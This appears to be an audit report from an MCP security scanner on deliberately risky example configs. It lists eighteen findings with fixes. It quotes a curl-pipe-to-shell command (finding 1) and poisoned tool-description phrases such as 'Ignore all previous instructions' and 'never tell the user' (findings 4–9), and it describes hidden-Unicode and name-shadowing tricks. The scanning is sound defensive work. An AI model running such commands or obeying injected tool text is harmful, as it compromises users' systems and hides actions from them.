# mcp-shield audit report

- **Target:** examples/risky-config.json, examples/risky-tools.json
- **Mode:** audit
- **Generated (UTC):** 2026-11-19T15:08:02Z
- **Risk score:** 100/100 (critical)

## Summary

| Severity | Count |
| --- | --- |
| critical | 5 |
| high | 6 |
| medium | 5 |
| low | 2 |
| info | 0 |

## Findings

| # | Severity | Check | Location | Title |
| --- | --- | --- | --- | --- |
| 1 | critical | pipe-to-shell | server 'setup-helper' | Argument pipes a remote download into a shell |
| 2 | critical | secret-in-env | server 'github' env 'GITHUB_TOKEN' | Live credential committed in env block |
| 3 | critical | shell-command | server 'quick-shell' | Server is launched through a shell |
| 4 | critical | tool-description-poisoning | tool 'read_file' | Tool description contains instruction-like content |
| 5 | critical | tool-description-poisoning | tool 'read_file' | Tool description contains instruction-like content |
| 6 | high | broad-filesystem-access | server 'filesystem' | Server is granted an overly broad filesystem path |
| 7 | high | secret-in-env | server 'github' env 'BACKUP_PASSWORD' | Secret-looking value stored in env block |
| 8 | high | tool-description-poisoning | tool 'read_file' | Tool description contains instruction-like content |
| 9 | high | tool-description-poisoning | tool 'read_file' | Tool description contains instruction-like content |
| 10 | high | tool-hidden-unicode | tool 'read_file' | Hidden Unicode characters in tool name/description |
| 11 | high | tool-name-collision | tools read-file, read_file | Tool names collide after normalisation |
| 12 | medium | tool-name-shadowing | tool 'read_file' | Tool name squats a well-known tool name |
| 13 | medium | tool-schema-missing | tool 'read_file' | Tool has no inputSchema |
| 14 | medium | unpinned-package | server 'filesystem' | Package executed without a version pin (npx) |
| 15 | medium | unpinned-package | server 'github' | Package executed without a version pin (npx) |
| 16 | medium | unpinned-package | server 'notes-db' | Package executed without a version pin (uvx) |
| 17 | low | tool-description-length | tool 'memory_store' | Tool description is excessively long |
| 18 | low | tool-schema-unconstrained | tool 'summarize_text' | Tool inputSchema lacks constraints |

## Details

### 1. [CRITICAL] Argument pipes a remote download into a shell

- **Check:** `pipe-to-shell`
- **Location:** server 'setup-helper'
- **Detail:** Argument "require('child_process').execSync('curl -s https://example.invalid/install.sh | sh')" downloads remote content and pipes it into a shell.
- **Remediation:** Remove download-and-execute arguments. Install the server from a pinned package through a package manager instead.

### 2. [CRITICAL] Live credential committed in env block

- **Check:** `secret-in-env`
- **Location:** server 'github' env 'GITHUB_TOKEN'
- **Detail:** The value of GITHUB_TOKEN matches the format of a GitHub personal access token (ghp_...). Anyone with read access to this config file owns the credential.
- **Remediation:** Rotate this credential now (treat it as leaked), remove it from the config, and inject it at runtime via an environment reference such as ${VAR} or a secret manager.

### 3. [CRITICAL] Server is launched through a shell

- **Check:** `shell-command`
- **Location:** server 'quick-shell'
- **Detail:** The server command is 'bash', a shell interpreter. Anything the MCP host passes (or a poisoned tool description tricks it into passing) becomes arbitrary command execution.
- **Remediation:** Invoke the server binary directly (e.g. 'node', 'python', the absolute path to the executable) instead of via a shell, and never use 'sh -c' style wrappers.

### 4. [CRITICAL] Tool description contains instruction-like content

- **Check:** `tool-description-poisoning`
- **Location:** tool 'read_file'
- **Detail:** Description tells the model to ignore other instructions: matched 'Ignore all previous instructions'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
- **Remediation:** Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

### 5. [CRITICAL] Tool description contains instruction-like content

- **Check:** `tool-description-poisoning`
- **Location:** tool 'read_file'
- **Detail:** Description tells the model to hide behaviour from the user: matched 'never tell the user'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
- **Remediation:** Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

### 6. [HIGH] Server is granted an overly broad filesystem path

- **Check:** `broad-filesystem-access`
- **Location:** server 'filesystem'
- **Detail:** Argument '/' grants access to a root/home-level path. A compromised or poisoned server can read or modify everything under it (SSH keys, cloud credentials, documents).
- **Remediation:** Scope the server to the narrowest project directory it actually needs instead of '/', '~' or a drive root.

### 7. [HIGH] Secret-looking value stored in env block

- **Check:** `secret-in-env`
- **Location:** server 'github' env 'BACKUP_PASSWORD'
- **Detail:** Variable BACKUP_PASSWORD has a secret-sounding name and a non-placeholder value stored in plaintext in the config file.
- **Remediation:** Move the secret out of the config file: reference the host environment (e.g. "${BACKUP_PASSWORD}") or use a secret manager, and rotate the value if the file was ever shared or committed.

### 8. [HIGH] Tool description contains instruction-like content

- **Check:** `tool-description-poisoning`
- **Location:** tool 'read_file'
- **Detail:** Description tries to force invocation order over other tools: matched 'before using any other tool'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
- **Remediation:** Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

### 9. [HIGH] Tool description contains instruction-like content

- **Check:** `tool-description-poisoning`
- **Location:** tool 'read_file'
- **Detail:** Description issues standing orders to the model: matched 'You must never'. Tool descriptions are loaded into the model's context; instructions inside them are a prompt-injection / tool-poisoning vector.
- **Remediation:** Rewrite the description to only state what the tool does, its inputs and its outputs. Remove any text addressed to the model (orders, secrecy, invocation rules).

### 10. [HIGH] Hidden Unicode characters in tool name/description

- **Check:** `tool-hidden-unicode`
- **Location:** tool 'read_file'
- **Detail:** Found invisible/control characters (U+200B, U+202E). These can hide instructions from human reviewers while the model still reads them.
- **Remediation:** Strip all zero-width and bidirectional control characters from tool names and descriptions; re-type the text plainly.

### 11. [HIGH] Tool names collide after normalisation

- **Check:** `tool-name-collision`
- **Location:** tools read-file, read_file
- **Detail:** Names read-file, read_file differ only by case or separators ('_', '-'), which many hosts and models treat as the same tool.
- **Remediation:** Rename one of the tools so every tool name is unambiguous.

### 12. [MEDIUM] Tool name squats a well-known tool name

- **Check:** `tool-name-shadowing`
- **Location:** tool 'read_file'
- **Detail:** 'read_file' is the name of a tool shipped by a popular MCP server. When two servers offer the same name, the model (and the user) cannot tell which implementation actually runs, so a malicious server can shadow a trusted one.
- **Remediation:** Namespace third-party tool names (e.g. 'acme_read_file') and remove servers that re-define names you already trust.

### 13. [MEDIUM] Tool has no inputSchema

- **Check:** `tool-schema-missing`
- **Location:** tool 'read_file'
- **Detail:** Without an inputSchema the host cannot validate arguments before they reach the server, and the model must guess the parameter shape.
- **Remediation:** Add a JSON Schema inputSchema describing every parameter, its type and constraints.

### 14. [MEDIUM] Package executed without a version pin (npx)

- **Check:** `unpinned-package`
- **Location:** server 'filesystem'
- **Detail:** 'npx @modelcontextprotocol/server-filesystem' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
- **Remediation:** Pin an exact version, e.g. '@modelcontextprotocol/server-filesystem@1.2.3', review the package, and only bump versions deliberately.

### 15. [MEDIUM] Package executed without a version pin (npx)

- **Check:** `unpinned-package`
- **Location:** server 'github'
- **Detail:** 'npx @modelcontextprotocol/server-github@latest' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
- **Remediation:** Pin an exact version, e.g. '@modelcontextprotocol/server-github@1.2.3', review the package, and only bump versions deliberately.

### 16. [MEDIUM] Package executed without a version pin (uvx)

- **Check:** `unpinned-package`
- **Location:** server 'notes-db'
- **Detail:** 'uvx mcp-server-sqlite' resolves the newest published version at launch time. If the package is hijacked or re-published with malicious code (a rug pull), it runs automatically with the MCP host's privileges.
- **Remediation:** Pin an exact version, e.g. 'mcp-server-sqlite@1.2.3', review the package, and only bump versions deliberately.

### 17. [LOW] Tool description is excessively long

- **Check:** `tool-description-length`
- **Location:** tool 'memory_store'
- **Detail:** Description is 1439 characters. Very long descriptions are a common place to bury injected instructions and inflate the tool's influence over the model.
- **Remediation:** Trim the description to a concise summary of behaviour, inputs and outputs.

### 18. [LOW] Tool inputSchema lacks constraints

- **Check:** `tool-schema-unconstrained`
- **Location:** tool 'summarize_text'
- **Detail:** string parameter 'text' has no maxLength/enum/format constraint; additionalProperties is not false, so undeclared parameters are accepted.
- **Remediation:** Constrain string parameters (maxLength, enum or format), and set additionalProperties to false so only declared parameters are accepted.
